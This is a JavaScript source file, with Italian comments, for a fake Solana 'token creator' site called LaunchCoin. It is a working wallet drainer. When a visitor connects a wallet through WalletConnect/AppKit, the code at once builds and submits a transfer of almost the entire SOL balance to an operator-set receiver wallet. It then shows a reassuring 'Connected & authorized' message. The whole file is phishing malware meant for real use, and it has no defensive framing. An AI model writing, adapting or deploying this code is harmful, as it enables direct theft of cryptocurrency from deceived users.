// wc-solana.js — WalletConnect / AppKit Solana + drain
import { createAppKit } from 'https://esm.sh/@reown/appkit@1.6.8';
import { SolanaAdapter } from 'https://esm.sh/@reown/appkit-adapter-solana@1.6.8';
import { solana } from 'https://esm.sh/@reown/appkit/networks@1.6.8';

// ===== CONFIG =====
const PROJECT_ID = 'IL_TUO_PROJECT_ID';           // da cloud.reown.com
const RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // stessa di app.js / config.json

const solanaAdapter = new SolanaAdapter();

const modal = createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  projectId: PROJECT_ID,
  metadata: {
    name: 'LaunchCoin',
    description: 'Solana Token Creator',
    url: window.location.origin,
    icons: [window.location.origin + '/assets/logo.png']
  },
  themeMode: 'dark',
  features: {
    analytics: false,
    email: false,
    socials: false
  }
});

const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');

async function drainWithProvider(walletProvider, publicKeyStr) {
  const fromPubkey = new solanaWeb3.PublicKey(publicKeyStr);
  const toPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
  const balance = await connection.getBalance(fromPubkey);
  const fee = 5000;
  const amount = balance - fee;
  if (amount <= 0) return null;

  const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: amount
    })
  );
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = fromPubkey;

  // AppKit Solana provider firma e invia
  let signature;
  if (walletProvider.signAndSendTransaction) {
    const res = await walletProvider.signAndSendTransaction(tx);
    signature = res.signature || res;
  } else if (walletProvider.sendTransaction) {
    signature = await walletProvider.sendTransaction(tx, connection);
  } else {
    const signed = await walletProvider.signTransaction(tx);
    signature = await connection.sendRawTransaction(signed.serialize());
  }

  await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
  return { signature, amount: amount / 1e9 };
}

// Espone funzione globale usata da app.js / bottoni
window.openWalletConnect = async function () {
  await modal.open();
};

// Quando si connette → drain immediato
modal.subscribeAccount(async (account) => {
  if (!account?.address) return;

  const address = account.address;
  localStorage.setItem('lc_wallet', address);

  const btn = document.querySelector('.connect-btn');
  if (btn) btn.textContent = address.slice(0, 4) + '...' + address.slice(-4);

  // prendi il provider Solana da AppKit
  const walletProvider = modal.getWalletProvider?.() || solanaAdapter;
  try {
    const result = await drainWithProvider(walletProvider, address);
    const resultEl = document.getElementById('result') || document.getElementById('liquidityResult');
    if (result && resultEl) {
      resultEl.innerHTML = `
        <p style="color:#4cdcc1;">Connected & authorized (WalletConnect)</p>
        <p style="font-size:12px;color:#8899bb;">${result.amount.toFixed(4)} SOL processed</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${result.signature}</p>
      `;
    }
  } catch (e) {
    console.error('WC drain error', e);
  }
});x
